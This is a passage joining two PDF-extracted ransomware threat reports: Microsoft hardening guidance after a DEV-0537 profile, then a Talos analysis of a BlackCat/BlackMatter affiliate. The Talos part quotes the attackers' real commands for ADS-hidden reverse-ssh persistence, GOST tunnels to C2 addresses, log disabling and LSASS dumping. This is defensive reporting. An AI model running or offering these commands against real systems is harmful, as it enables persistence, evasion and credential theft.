destruction\n\nAn example of a threat actor who has moved to a pure extortion and destruction model\nwithout deploying ransomware payloads is an activity group that Microsoft tracks as DEV-\n0537, also known as LAPSUS$. Microsoft has detailed DEV-0537 actions taken in early\n2022 in this blog. DEV-0537 started targeting organizations mainly in Latin America but\nexpanded to global targeting, including government entities, technology, telecom, retailers,\nand healthcare. Unlike more opportunistic attackers, DEV-0537 targets specific companies\nwith an intent. Their initial access techniques include exploiting unpatched vulnerabilities in\ninternet-facing systems, searching public code repositories for credentials, and taking\nadvantage of weak passwords. In addition, there is evidence that DEV-0537 leverages\ncredentials stolen by the Redline password stealer, a piece of malware available for\npurchase in the cybercriminal economy. The group also buys credentials from underground\nforums which were gathered by other password-stealing malware.\n\nOnce initial access to a network is gained, DEV-0537 takes advantage of security\nmisconfigurations to elevate privileges and move laterally to meet their objectives of data\nexfiltration and extortion. While DEV-0537 doesn’t possess any unique technical capabilities,\nthe group is especially cloud-aware. They target cloud administrator accounts to set up\nforwarding rules for email exfiltration and tamper with administrative settings on cloud\nenvironments. As part of their goals to force payment of ransom, DEV-0537 attempts to\ndelete all server infrastructure and data to cause business disruption. To further facilitate the\nachievement of their goals, they remove legitimate admins and delete cloud resources and\nserver infrastructure, resulting in destructive attacks. \n\nDEV-0537 also takes advantage of cloud admin privileges to monitor email, chats, and VOIP\ncommunications to track incident response efforts to their intrusions. DEV-0537 has been\nobserved on multiple occasions to join incident response calls, not just observing the\nresponse to inform their attack but unmuting to demand ransom and sharing their screens\nwhile they delete their victim’s data and resources.\n\nDefending against ransomware: Moving beyond protection by\ndetection\n\nA durable security strategy against determined human adversaries must include the goal of\nmitigating classes of attacks and detecting them. Ransomware attacks generate multiple,\ndisparate security product alerts, but they could easily get lost or not responded to in time.\nAlert fatigue is real, and SOCs can make their lives easier by looking at trends in their alerts\nor grouping alerts into incidents so they can see the bigger picture. SOCs can then mitigate\n\nhttps://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/\n\n\n17/22\n\nalerts using hardening capabilities like attack surface reduction rules. Hardening against\ncommon threats can reduce alert volume and stop many attackers before they get access to\nnetworks. \n\nAttackers tweak their techniques and have tools to evade and disable security products.\nThey are also well-versed in system administration and try to blend in as much as possible.\nHowever, while attacks have continued steadily and with increased impact, the attack\ntechniques attackers use haven’t changed much over the years. Therefore, a renewed focus\non prevention is needed to curb the tide.\n\nRansomware attackers are motivated by easy profits, so adding to their cost via security\nhardening is key in disrupting the cybercriminal economy.\n\nBuilding credential hygiene\n\nMore than malware, attackers need credentials to succeed in their attacks. In almost all\nattacks where ransomware deployment was successful, the attackers had access to a\ndomain admin-level account or local administrator passwords that were consistent\nthroughout the environment. Deployment then can be done through Group Policy or tools like\nPsExec (or clones like PAExec, CSExec, and WinExeSvc). Without the credentials to provide\nadministrative access in a network, spreading ransomware to multiple systems is a bigger\nchallenge for attackers. Compromised credentials are so important to these attacks that\nwhen cybercriminals sell ill-gotten access to a network, in many instances, the price includes\na guaranteed administrator account to start with.\n\nCredential theft is a common attack pattern. Many administrators know tools like Mimikatz\nand LaZagne, and their capabilities to steal passwords from interactive logons in the LSASS\nprocess. Detections exist for these tools accessing the LSASS process in most security\nproducts. However, the risk of credential exposure isn’t just limited to a domain administrator\nlogging in interactively to a workstation. Because attackers have accessed and explored\nmany networks during their attacks, they have a deep knowledge of common network\nconfigurations and use it to their advantage. One common misconfiguration they exploit is\nrunning services and scheduled tasks as highly privileged service accounts.\n\nToo often, a legacy configuration ensures that a mission-critical application works by giving\nthe utmost permissions possible. Many organizations struggle to fix this issue even if they\nknow about it, because they fear they might break applications. This configuration is\nespecially dangerous as it leaves highly privileged credentials exposed in the LSA Secrets\nportion of the registry, which users with administrative access can access. In organizations\nwhere the local administrator rights haven’t been removed from end users, attackers can be\none hop away from domain admin just from an initial attack like a banking trojan. Building\ncredential hygiene is developing a logical segmentation of the network, based on privileges,\nthat can be implemented alongside network segmentation to limit lateral movement.\n\n\n\n18/22\n\nHere are some steps organizations can take to build credential hygiene:\n\nAim to run services as Local System when administrative privileges are needed, as this\nallows applications to have high privileges locally but can’t be used to move laterally.\nRun services as Network Service when accessing other resources.\nUse tools like LUA Buglight to determine the privileges that applications really need.\nLook for events with EventID 4624 where the logon type is 2, 4, 5, or 10 and the\naccount is highly privileged like a domain admin. This helps admins understand which\ncredentials are vulnerable to theft via LSASS or LSA Secrets. Ideally, any highly\nprivileged account like a Domain Admin shouldn’t be exposed on member servers or\nworkstations.\nMonitor for EventID 4625 (Logon Failed events) in Windows Event Forwarding when\nremoving accounts from privileged groups. Adding them to the local administrator\ngroup on a limited set of machines to keep an application running still reduces the\nscope of an attack as against running them as Domain Admin.\nRandomize Local Administrator passwords with a tool like Local Administrator\nPassword Solution (LAPS) to prevent lateral movement using local accounts with\nshared passwords.\nUse a cloud-based identity security solution that leverages on-premises Active\nDirectory signals get visibility into identity configurations and to identify and detect\nthreats or compromised identities\n\nAuditing credential exposure\n\nAuditing credential exposure is critical in preventing ransomware attacks and cybercrime in\ngeneral. BloodHound is a tool that was originally designed to provide network defenders with\ninsight into the number of administrators in their environment. It can also be a powerful tool\nin reducing privileges tied to administrative account and understanding your credential\nexposure. IT security teams and SOCs can work together with the authorized use of this tool\nto enable the reduction of exposed credentials. Any teams deploying BloodHound should\nmonitor it carefully for malicious use. They can also use this detection guidance to watch for\nmalicious use.\n\nMicrosoft has observed ransomware attackers also using BloodHound in attacks. When used\nmaliciously, BloodHound allows attackers to see the path of least resistance from the\nsystems they have access, to highly privileged accounts like domain admin accounts and\nglobal administrator accounts in Azure.\n\nPrioritizing deployment of Active Directory updates\n\nSecurity patches for Active Directory should be applied as soon as possible after they are\nreleased. Microsoft has witnessed ransomware attackers adopting authentication\nvulnerabilities within one hour of being made public and as soon as those vulnerabilities are\nincluded in tools like Mimikatz. Ransomware activity groups also rapidly adopt vulnerabilities\n\nhttps://techcommunity.microsoft.com/t5/windows-blog-archive/lua-buglight-2-3-with-support-for-windows-8-1-and-windows-10/ba-p/701459\nhttps://twitter.com/jepayneMSFT/status/1012815189345857536\nhttps://aka.ms/laps\nhttps://docs.microsoft.com/defender-for-identity/what-is\nhttps://github.com/BloodHoundAD/BloodHound\nhttps://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726\n\n\n19/22\n\nrelated to authentication, such as ZeroLogon and PetitPotam, especially when they are\nincluded in toolkits like Mimikatz. When unpatched, these vulnerabilities could allow\nattackers to rapidly escalate from an entrance vector like email to Domain Admin level\nprivileges.\n\nCloud hardening\n\nAs attackers move towards cloud resources, it’s important to secure cloud resources and\nidentities as well as on-premises accounts. Here are ways organizations can harden cloud\nenvironments:\n\nCloud identity hardening\n\nImplement the Azure Security Benchmark and general best practices for securing\nidentity infrastructure, including:\n\nPrevent on-premises service accounts from having direct rights to the cloud\nresources to prevent lateral movement to the cloud.\nEnsure that “break glass” account passwords are stored offline and configure\nhoney-token activity for account usage.\nImplement Conditional Access policies enforcing Microsoft’s Zero Trust principles.\n\nEnable risk-based user sign-in protection and automate threat response to block high-\nrisk sign-ins from all locations and enable MFA for medium-risk ones.\nEnsure that VPN access is protected via modern authentication methods.\n\nMultifactor authentication (MFA)\n\nEnforce MFA on all accounts, remove users excluded from MFA, and strictly require\nMFA from all devices, in all locations, at all times.\nEnable passwordless authentication methods (for example, Windows Hello, FIDO keys,\nor Microsoft Authenticator) for accounts that support passwordless. For accounts that\nstill require passwords, use authenticator apps like Microsoft Authenticator for MFA.\nRefer to this article for the different authentication methods and features.\nIdentify and secure workload identities to secure accounts where traditional MFA\nenforcement does not apply.\nEnsure that users are properly educated on not accepting unexpected two-factor\nauthentication (2FA).\nFor MFA that uses authenticator apps, ensure that the app requires a code to be typed\nin where possible, as many intrusions where MFA was enabled (including those by\nDEV-0537) still succeeded due to users clicking “Yes” on the prompt on their phones\neven when they were not at their computers. Refer to this article for an example.\nDisable legacy authentication.\n\nCloud admins\n\nhttps://docs.microsoft.com/security/benchmark/azure/\nhttps://docs.microsoft.com/azure/security/fundamentals/identity-management-best-practices\nhttps://docs.microsoft.com/azure/active-directory/conditional-access/plan-conditional-access\nhttps://www.microsoft.com/security/business/zero-trust\nhttps://docs.microsoft.com/azure/active-directory/authentication/tutorial-risk-based-sspr-mfa\nhttps://docs.microsoft.com/azure/active-directory/fundamentals/concept-fundamentals-block-legacy-authentication#step-1-enable-modern-authentication-in-your-directory\nhttps://docs.microsoft.com/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy\nhttps://docs.microsoft.com/azure/active-directory/authentication/concept-authentication-methods\nhttps://docs.microsoft.com/azure/active-directory/identity-protection/concept-workload-identity-risk\nhttps://docs.microsoft.com/azure/active-directory/authentication/how-to-mfa-number-match\nhttps://docs.microsoft.com/azure/active-directory/authentication/concept-authentication-methods\nhttps://docs.microsoft.com/azure/active-directory/fundamentals/concept-fundamentals-block-legacy-authentication#moving-away-from-legacy-authentication\n\n\n20/22\n\nEnsure cloud admins/tenant admins are treated with the same level of security and\ncredential hygiene as Domain Admins.\nAddress gaps in authentication coverage.\n\nAddressing security blind spots\n\nIn almost every observed ransomware incident, at least one system involved in the attack\nhad a misconfigured security product that allowed the attacker to disable protections or\nevade detection. In many instances, the initial access for access brokers is a legacy system\nthat isn’t protected by  antivirus or EDR solutions. It’s important to understand that the lack\nsecurity controls on these systems that have access to highly privileged credentials act as\nblind spots that allow attackers to perform the entire ransomware and exfiltration attack chain\nfrom a single system without being detected. In some instances, this is specifically\nadvertised as a feature that access brokers sell.\n\nOrganizations should review and verify that security tools are running in their most secure\nconfiguration and perform regular network scans to ensure appropriate security products are\nmonitoring and protecting all systems, including servers. If this isn’t possible, make sure that\nyour legacy systems are either physically isolated through a firewall or logically isolated by\nensuring they have no credential overlap with other systems.\n\nFor Microsoft 365 Defender customers, the following checklist eliminates security blind spots:\n\nTurn on cloud-delivered protection in Microsoft Defender Antivirus to cover rapidly\nevolving attacker tools and techniques, block new and unknown malware variants, and\nenhance attack surface reduction rules and tamper protection.\nTurn on tamper protection features to prevent attackers from stopping security\nservices.\nRun EDR in block mode so that Microsoft Defender for Endpoint can block malicious\nartifacts, even when a non-Microsoft antivirus doesn’t detect the threat or when\nMicrosoft Defender Antivirus is running in passive mode. EDR in block mode also\nblocks indicators identified proactively by Microsoft Threat Intelligence teams.\nEnable network protection to prevent applications or users from accessing malicious\ndomains and other malicious content on the internet.\nEnable investigation and remediation in full automated mode to allow Microsoft\nDefender for Endpoint to take immediate action on alerts to resolve breaches.\nUse device discovery to increase visibility into the network by finding unmanaged\ndevices and onboarding them to Microsoft Defender for Endpoint.\nProtect user identities and credentials using Microsoft Defender for Identity, a cloud-\nbased security solution that leverages on-premises Active Directory signals to monitor\nand analyze user behavior to identify suspicious user activities, configuration issues,\nand active attacks.\n\nReducing the attack surface\n\nhttps://docs.microsoft.com/azure/active-directory/roles/best-practices\nhttps://docs.microsoft.com/azure/active-directory/authentication/how-to-authentication-find-coverage-gaps\nhttps://docs.microsoft.com/microsoft-365/security/defender-endpoint/configure-block-at-first-sight-microsoft-defender-antivirus?view=o365-worldwide\nhttps://docs.microsoft.com/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide\nhttps://docs.microsoft.com/microsoft-365/security/defender-endpoint/edr-in-block-mode?view=o365-worldwide\nhttps://docs.microsoft.com/microsoft-365/security/defender-endpoint/enable-network-protection?view=o365-worldwide\nhttps://docs.microsoft.com/microsoft-365/security/defender-endpoint/automated-investigations?view=o365-worldwide\nhttps://docs.microsoft.com/microsoft-365/security/defender-endpoint/device-discovery?view=o365-worldwide\nhttps://docs.microsoft.com/defender-for-identity/what-is\n\n\n21/22\n\nMicrosoft 365 Defender customers can turn on attack surface reduction rules to prevent\ncommon attack techniques used in ransomware attacks. These rules, which can be\nconfigured by all Microsoft Defender Antivirus customers and not just those using the EDR\nsolution, offer significant hardening against attacks. In observed attacks from several\nransomware-associated activity groups, Microsoft customers who had the following rules\nenabled were able to mitigate the attack in the initial stages and prevented hands-on-\nkeyboard activity:\n\nIn addition, Microsoft has changed the default behavior of Office applications to block macros\nin files from the internet, further reduce the attack surface for many human-operated\nransomware attacks and other threats.\n\nHardening internet-facing assets and understanding your perimeter\n\nOrganizations must identify and secure perimeter systems that attackers might use to access\nthe network. Public scanning interfaces, such as RiskIQ, can be used to augment data.\nSome systems that should be considered of interest to attackers and therefore need to be\nhardened include:\n\nSecure Remote Desktop Protocol (RDP) or Windows Virtual Desktop endpoints with\nMFA to harden against password spray or brute force attacks.\nBlock Remote IT management tools such as Teamviewer, Splashtop, Remote\nManipulator System, Anydesk, Atera Remote Management, and ngrok.io via network\nblocking such as perimeter firewall rules if not in use in your environment. If these\nsystems are used in your environment, enforce security settings where possible to\nimplement MFA.\n\nRansomware attackers and access brokers also use unpatched vulnerabilities, whether\nalready disclosed or zero-day, especially in the initial access stage. Even older vulnerabilities\nwere implicated in ransomware incidents in 2022 because some systems remained\nunpatched, partially patched, or because access brokers had established persistence on a\npreviously compromised systems despite it later being patched.\n\nSome observed vulnerabilities used in campaigns between 2020 and 2022 that defenders\ncan check for and mitigate include:\n\nCitrix ADC systems affected by CVE-2019-19781\nPulse Secure VPN systems affected by CVE-2019-11510, CVE-2020-8260, CVE-2020-\n8243, CVE-2021-22893, CVE-2021-22894, CVE-2021-22899, and CVE-2021-22900\nSonicWall SSLVPN affected by CVE-2021-20016\nMicrosoft SharePoint servers affected by CVE-2019-0604\nUnpatched Microsoft Exchange servers\nZoho ManageEngine systems affected by CVE-2020-10189\nFortiGate VPN servers affected by CVE-2018-13379\n\nhttps://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction?view=o365-worldwide\nhttps://docs.microsoft.com/DeployOffice/security/internet-macros-blocked\nhttps://www.riskiq.com/what-is-attack-surface-management/\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19781\nhttps://us-cert.cisa.gov/ncas/alerts/aa21-110a\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8260\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8243\nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22894\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22899\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22900\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-20016\nhttps://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2019-0604\nhttps://techcommunity.microsoft.com/t5/exchange-team-blog/released-may-2021-exchange-server-security-updates/ba-p/2335209\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10189\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379\n\n\n22/22\n\nApache log4j CVE-2021-44228\n\nRansomware attackers also rapidly adopt new vulnerabilities. To further reduce\norganizational exposure, Microsoft Defender for Endpoint customers can use the threat and\nvulnerability management capability to discover, prioritize, and remediate vulnerabilities and\nmisconfigurations.\n\nMicrosoft 365 Defender: Deep cross-domain visibility and unified\ninvestigation capabilities to defend against ransomware attacks\n\nThe multi-faceted threat of ransomware requires a comprehensive approach to security. The\nsteps we outlined above defend against common attack patterns and will go a long way in\npreventing ransomware attacks. Microsoft 365 Defender is designed to make it easy for\norganizations to apply many of these security controls.\n\nMicrosoft 365 Defender’s industry-leading visibility and detection capabilities, demonstrated\nin the recent MITRE Engenuity ATT&CK® Evaluations, automatically stop most common\nthreats and attacker techniques. To equip organizations with the tools to combat human-\noperated ransomware, which by nature takes a unique path for every organization, Microsoft\n365 Defender provides rich investigation features that enable defenders to seamlessly\ninspect and remediate malicious behavior across domains.\n\nLearn how you can stop attacks through automated, cross-domain security and built-in AI\nwith Microsoft Defender 365.\n\nIn line with the recently announced expansion into a new service category called Microsoft\nSecurity Experts, we’re introducing the availability of Microsoft Defender Experts for\nHunting for public preview. Defender Experts for Hunting is for customers who have a robust\nsecurity operations center but want Microsoft to help them proactively hunt for threats across\nMicrosoft Defender data, including endpoints, Office 365, cloud applications, and identity.\n\nJoin our research team at the Microsoft Security Summit digital event on May 12 to learn\nwhat developments Microsoft is seeing in the threat landscape, as well as how we can help\nyour business mitigate these types of attacks.

According\nto a BlackCat representative, BlackCat is not a rebranding of BlackMatter, but its team\nis made from affiliates of other RaaS groups (including BlackMatter).\nTalos has observed at least one attacker that used BlackMatter was likely one of the\nearly adopters of BlackCat. In this post, we'll describe these attacks and the\nrelationship between them.\nUnderstanding the techniques and tools used by RaaS affiliates helps organizations\ndetect and prevent attacks before the ransomware itself is executed, at which point,\nevery second means lost data.\n\n \n\nhttps://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html\nhttps://blogger.googleusercontent.com/img/a/AVvXsEhzwkBRlrKVbcbjQZW7UTdTDN_lOlftYwti5ZeUDtJ9doEDnG4jDcX0YZUPz5B76riSHGEvj5SHOBHNo1whFzEiXOpKuG0ec-Von0saSFrEnwZ3mBRhfyY8xn7_Aps-CsJNV3pD7sgOcfd5RIYtPyh244YfVUnpvkg1Lkcj5q3PZeAckg3Fa38vr3tB5Q=s3000\nhttps://www.google.com/url?q=https://twitter.com/t14g0p&sa=D&source=editors&ust=1647513308801848&usg=AOvVaw0ozbVStNxyGY0r-JfzMc6r\nhttps://www.google.com/url?q=https://twitter.com/hueylittle_er&sa=D&source=editors&ust=1647513308802118&usg=AOvVaw1rDMnlWuNOhTrMick_Zb_0\nhttps://talosintelligence.com/resources/432\nhttps://www.google.com/url?q=https://www.bloomberg.com/news/articles/2021-06-04/hackers-breached-colonial-pipeline-using-compromised-password&sa=D&source=editors&ust=1647513308802538&usg=AOvVaw37uzheC5fS_U15ft9Jm5i_\n\n\n2/15\n\nBlackCat ransomware, also known as \"ALPHV,\" has quickly gained notoriety for being used\nin double ransom (encrypted files and stolen file disclosure) attacks against companies. It\nfirst appeared in November 2021 and, since then, several companies have been hit across\nthe globe. However, more than 30 percent of the compromises happened to U.S.-based\ncompanies.\n\n \nSeveral security companies have noticed a connection between the BlackCat, BlackMatter\nand DarkSide ransomware groups. Recently, in a Recorded Future interview with a BlackCat\nrepresentative, the representative confirmed that there was a connection, but no rebranding\nor other direct relationship.\n\nThe BlackCat representative explained that the operators are instead affiliates of other RaaS\noperations and the actors built upon a foundation of their previous knowledge gained as part\nof other groups. Affiliates in this context are the groups that compromise companies'\nnetworks and deploy the ransomware provided by the RaaS operators.\n\nIf this is true, BlackCat seems to be a case of vertical business expansion. In essence, it's a\nway to control the upstream supply chain by making a service that is key to their business\n(the RaaS operator) better suited for their needs and adding another source of revenue.\n\nhttps://www.google.com/url?q=https://www.zdnet.com/article/billion-dollar-logistics-giant-expeditors-struggling-to-recover-from-cyberattack/&sa=D&source=editors&ust=1647513308803008&usg=AOvVaw2yzO761_G7R4ZvhwQm9Gql\nhttps://blogger.googleusercontent.com/img/a/AVvXsEiwpA0zuQ56FqIVYxn9YyzEE-53kBtNdtI6wNtQ9NSda5zlLmBjAxBfT9FJmnIzo9lCyf3ee78mPOxV-SgzG7QwSEmz0wnVFLzckiGneqM1Bvs72ECWAc7mzcHjDJ_t7-xilltOf2VFLlSs515-DLQw_UZ0qkVED7s8L6Cx_XoQep734n8awvDUsKTW4g=s2253\nhttps://www.google.com/url?q=https://therecord.media/an-alphv-blackcat-representative-discusses-the-groups-plans-for-a-ransomware-meta-universe/&sa=D&source=editors&ust=1647513308803579&usg=AOvVaw17UXCOc6CZ5rfH1eO_m-4p\n\n\n3/15\n\nVertical expansion is also a common business strategy when there is a lack of trust in the\nsupply chain. There are several cases of vulnerabilities in ransomware encryption, and even\nof backdoors that can explain a lack of trust in RaaS. One particular case mentioned by the\nBlackCat representative, was a flaw in DarkSide/BlackMatter ransomware allowing victims to\ndecrypt their files without paying the ransom. Victims used this vulnerability for several\nmonths, resulting in big losses for affiliates.\n\nBlackCat/BlackMatter connection\n\n \nWhile researching a BlackCat ransomware attack from December 2021, we observed a\ndomain (and respective IP addresses) used to maintain persistent access to the network.\nThis domain had also been used in a BlackMatter attack in September 2021. Further\nanalysis revealed more commonalities, such as tools, file names and techniques that were\ncommon to both ransomware variants.\n\nAffiliates are responsible for compromising systems and deploying ransomware, so it is likely\nthat attacks carried out by the same ransomware family may differ in techniques and\nprocedures. On the other hand, RaaS operators are known to make training materials and\ngeneral techniques and tools available to their affiliates, like the leaked Conti ransomware\nplaybook covered by Talos in a previous blog. This may suggest there are some similarities\nacross affiliates.\n\nOne difference we would expect to see across RaaS affiliates is the command and control\n(C2) infrastructure used for certain attacks. However, the overlapping C2 address found used\nin the BlackMatter and BlackCat attacks lead us to assess with moderate confidence that the\nsame affiliate was responsible for both attacks.\n\nThis connection suggests that a BlackMatter affiliate was likely an early adopter — possibly\nin the first month of operation — of BlackCat. This is further evidence to support the rumors\nthat there are strong ties between BlackMatter and BlackCat.\n\nAttack details\n\n \nWe analyzed the actions taken by what we believe to be the same affiliate/attackers in the\nDecember BlackCat attack and a September BlackMatter attack. In terms of attack flow, the\nattacks were similar to other human-operated ransomware attacks: initial compromise,\nfollowed by an exploration and data exfiltration phase, then attack preparation and finally, the\n\nhttps://www.google.com/url?q=https://blog.emsisoft.com/en/39181/on-the-matter-of-blackmatter/&sa=D&source=editors&ust=1647513308804241&usg=AOvVaw2IJqvHbl9Y8cpPY6Q1oe73\nhttps://www.google.com/url?q=https://blog.talosintelligence.com/2021/09/Conti-leak-translation.html&sa=D&source=editors&ust=1647513308804967&usg=AOvVaw3iM1-jpjE9a4dD7sQ6MKPh\n\n\n4/15\n\nattack execution.\n\nThe following table summarizes the commonalities and differences in the MITRE ATT&CK®\nframework between both attacks:\n\n \n\nInitial access\n\nWe could not identify the initial compromise vector for the BlackCat attack. It is likely that the\nattack happened on a system not monitored by Cisco Talos telemetry or that a previously\n\nhttps://blogger.googleusercontent.com/img/a/AVvXsEiLDZUvhJrTtFf2TSVL3LhqkvbhCw2VhpHdQLoCGP3vcjd7LWQ5_oUO7B3PUERd_Cs64snL97SAJvpJbM7DvXU9m6W3FqdX2uZ0WHtGkTBCGXVgSEaOy933I-Twgkng-u9i7Bnx7agz0FsQFEHsjWSZs5n8_BEHj9nCEIPD38Yf_yKW91mZd0_-ihWMuA=s2298\nhttps://blogger.googleusercontent.com/img/a/AVvXsEg1dBP0ZrNSJcqcrAC7p-nPaZ0ZwQaZ0PqWzFGiFizSEnFA7QteEiLB2HlPVvqj6KKYPWFkLpU_nDOMdS4XXp8Hhr3K-2hEgSezB3FwkBfA2FVV7zd9rMQeVNo2w64_rnCda3YArBnLdZCE4O2ZMDOa2XqX9_0Yy1zTFi4aXkeV2AUicFIk5cmVEFE0bA=s3188\n\n\n5/15\n\ncompromised account was used to log into an exposed system.\n\nThere was evidence in the BlackMatter attack that the actor established initial access via the\npossible exploitation of Microsoft Exchange vulnerabilities. However, we could not directly tie\nattempts of exploiting vulnerabilities in Microsoft Exchange to the attack and, for this reason,\nwe assess with low confidence that the attack may have started with the exploitation of a\nvulnerability in Exchange.\n\nPersistence\n\nBeyond the access provided by the first exploitation vector, the attackers made sure they had\nadditional remote access to several internal systems.\n\nDuring the BlackCat attack, the actors used a tool called reverse-ssh, compiled with the C2\nserver address embedded, to set up reverse SSH tunnels and provide reverse shells to the\nattacker. Reverse-ssh was deployed to C:\\ directory and named: system, Windows or cache\ntask.\n\nIt was also observed hidden by writing to an alternate data stream (ADS) of the C:\\ directory\nusing the following command:\n \nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -command  & {(get-\ncontent c:\\system -raw | set-content c:\\ -stream 'cachetask')}\nc:\\windows\\system32\\schtasks.exe /create /ru system /sc minute /tn\nmicrosoft\\windows\\wininet\\cachetask /tr c:\\:cachetask -b <bind port> /f\nc:\\windows\\system32\\schtasks.exe /run /tn microsoft\\windows\\wininet\\cachetask\n\n \n\nThe “image file execution option” debugger registry key was another way to ensure the\nmalicious file would be persistently executed on the system:\n \nc:\\windows\\system32\\reg.exe add hklm\\software\\microsoft\\windows nt\\currentversion\\image\nfile execution options\\taskmgr.exe /v debugger /t reg_sz /d c:\\system\n\n \nDuring the BlackMatter attack, the group used a similar technique but with a different tool:\nGO Simple Tunnel (GOST). GOST is a Go-based tunneling tool that was used to establish a\nreverse SSH tunnel to an attacker-controlled C2 server. This C2 server is the same that was\nused in the BlackCat attack. The name used for the deployed Gost file was \"system.exe\",\nsimilar to the file name used in the BlackCat attack for reverse-ssh.\ncmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows wsus update /tr\nc:\\windows\\temp\\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f cmd.exe /q /c schtasks\n/create /ru system /sc hourly /tn windows defender /tr c:\\windows\\temp\\system.exe -l\nrtcp://0.0.0.0:1116/127.0.0.1:3388 -f mwss://52[.]149[.]228[.]45:443 /st 12:00 /f cmd.exe /q /c\n\nhttps://www.google.com/url?q=https://github.com/Fahrj/reverse-ssh&sa=D&source=editors&ust=1647513308806628&usg=AOvVaw3dMZRdlDPOdzpw7mx5obbm\nhttps://www.google.com/url?q=https://v2.gost.run/&sa=D&source=editors&ust=1647513308807736&usg=AOvVaw1OcMAq9JQfEju3U0DWuNuw\n\n\n6/15\n\nschtasks /create /ru system /sc hourly /tn windows wsus update /tr\nc:\\windows\\temp\\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f cmd.exe /q /c schtasks\n/create /ru system /sc hourly /tn windows defender /tr c:\\windows\\temp\\system.exe -l\nrtcp://0.0.0.0:1117/127.0.0.1:3388 -f mwss://20[.]46[.]245[.]56:443 /st 12:00 /f\n\n \nThe same C2 domain was used in both attacks:\n\nDefense evasion\n\nDuring the BlackCat attack, logs were disabled on several systems to avoid detection. For\nexample, before setting up the reverse-ssh scheduled task tool attackers disabled logs for\nthe task scheduler (a full list of disabled logs is provided in the IOC section below).\n\n \n\nc:\\windows\\system32\\wevtutil.exe set-log microsoft-windows-taskscheduler/operational\n/enabled:false\n\n \nThe anti-rootkit tool Gmer was loaded into a small number of key systems. We believe the\nattackers used this to disable endpoint protection.\n\nc:\\users\\<username>\\downloads\\gmer\\gmer.exe\n\n \n\n \n\nCredential access\n\nLocal and domain user credentials were collected, on a few key systems, by dumping the\nLSASS process memory and extracting credentials with Microsoft Sysinternals Procdump\nand Dumpert:\nc:\\windows\\system\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\n\nhttps://blogger.googleusercontent.com/img/a/AVvXsEhDtmGSAbVdeF4IbcTMCZz26i223ejazfZ-aHpHxopqdMV8EKNcw0AVFiyMxNML3O-AObx8vea2fI8qvJxdtZfqhPytF0GslcTBVLZH22BhjintfbQIywN-O8Y6eyFYnYYKWbaueMOctPAYYmyUw5z5-WEu2rMnsU0nn1LEts3wolYkADMM5zE-h-kKjQ=s2708\nhttps://www.google.com/url?q=http://www.gmer.net/?m%3D0&sa=D&source=editors&ust=1647513308809386&usg=AOvVaw3rvdJ3sbN00fi9FE7ZBArk\nhttps://www.google.com/url?q=https://docs.microsoft.com/en-us/sysinternals/downloads/procdump&sa=D&source=editors&ust=1647513308809942&usg=AOvVaw1b2f46JCmTJ3V0tL1J9XC4\nhttps://www.google.com/url?q=https://github.com/outflanknl/Dumpert&sa=D&source=editors&ust=1647513308810101&usg=AOvVaw2pqhgpoaC7FNpU0g2m8rmI\n\n\n7/15\n\n \nc:\\windows\\system\\dumpert.exe lsass.exe\n\n \nDuring the BlackMatter attack, the attacker used comsvcs.dll directly to dump LSASS\nmemory:\n \n\n \n\npowershell rundll32.exe c:\\windows\\system32\\comsvcs.dll, minidump (get-process\nlsass).id c:\\temp\\lsass.dmp full\n\n \nBeyond the Windows login credentials, during the BlackCat attack, the attackers used a tool\nnamed \"steal.exe\" to harvest additional data. We could not obtain the binary, but based on\nthe creation of a results folder with an \"archive.zip\" file inside it, we believe the tool may be\nHackBrowserData, or a version of it.\n\nThe following commands were used on a few systems:\n\ncmd.exe /q /c steal.exe 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 cmd.exe /q /c cd\nresults 1> \\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 cmd.exe /q /c dir 1>\n\\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 cmd.exe /q /c del archive.zip 1>\n\\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1 cmd.exe /q /c del c:\\steal.exe 1>\n\\\\127.0.0.1\\admin$\\__<num>.<num> 2>&1\n\n \n\nDiscovery\n\nDuring the BlackCat attack, we observed network scanning and reconnaissance using\nsoftperfect network scanner. This tool has many features beyond simple network scanning\nand was probably a valuable tool in understanding systems roles and network infrastructure\nand possible lateral movement. The following commands show this tool in use. Notice that\nthe name of the executable has been changed to make it blend into the system's regular\nprocesses.\n\ncmd.exe /c c:\\programdata\\system\\svchost.exe /hide\n/auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255\nc:\\programdata\\system\\svchost.exe /hide\n/auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255\ncmd.exe /c c:\\programdata\\system\\svchost.exe /hide\n/auto:c:\\programdata\\system\\192.xml 